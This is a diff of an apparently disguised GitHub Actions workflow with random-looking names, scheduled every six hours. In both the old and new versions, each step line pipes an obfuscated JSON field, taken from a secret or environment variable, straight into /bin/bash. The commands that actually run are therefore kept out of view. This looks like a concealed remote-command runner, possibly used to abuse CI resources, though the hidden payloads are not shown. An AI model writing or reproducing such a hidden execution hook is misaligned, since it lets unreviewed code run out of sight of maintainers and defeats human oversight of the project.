@@ -3,24 +3,18 @@ name: dingqianxuan6453
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 3/6 * * *'
-
+    - cron: '41 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dingqianxuan6453
         env:
-          ttr89422: ${{ secrets.ttr89422 }}
+          c9331: ${{ secrets.c9331 }}
         run: |
-          echo $ttr89422 | jq -r .lyyt0 | /bin/bash
-          echo $mk23 | jq -r .nbo531 | /bin/bash
-          echo $vi3257 | jq -r .jxtv5 | /bin/bash
-          echo $q24 | jq -r .vz36 | /bin/bash
-          echo $rin34634 | jq -r .khynm28 | /bin/bash
-          echo $pzxfn865 | jq -r .qbt45680 | /bin/bash
-          echo $pvvxi936 | jq -r .y5 | /bin/bash
-          echo $f308 | jq -r .l54733 | /bin/bash
-          echo $swcw91 | jq -r .cowrb40 | /bin/bash
+          echo $c9331 | jq -r .ovvxs3894 | /bin/bash
+          echo $xwsi237 | jq -r .q0118 | /bin/bash
+          echo $yhjj9349 | jq -r .evq20085 | /bin/bash
 
